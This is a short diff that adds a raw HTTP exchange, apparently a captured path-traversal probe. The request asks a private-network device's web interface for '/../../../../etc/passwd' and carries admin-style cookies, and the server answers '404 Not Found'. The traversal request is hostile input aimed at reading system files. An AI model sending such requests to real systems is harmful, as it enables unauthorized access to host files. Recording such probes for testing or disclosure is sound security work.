@@ -1,0 +1,28 @@
+GET /../../../../etc/passwd HTTP/1.1
+Host: 172.30.1.254:8899
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://172.30.1.254:8899/status/system_info
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 43
+Origin: http://172.30.1.254:8899
+DNT: 1
+Connection: keep-alive
+Cookie: user_id=admin; sid=214c5f8e6792f284
+
+dummyVal=2025618174608608&level=0
+
+
+
+HTTP/1.1 404 Not Found
+Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate
+Pragma: no-cache
+Expires: 0
+Content-Type: text/plain
+Connection: close
+Content-Length: 9
+
+Not Found
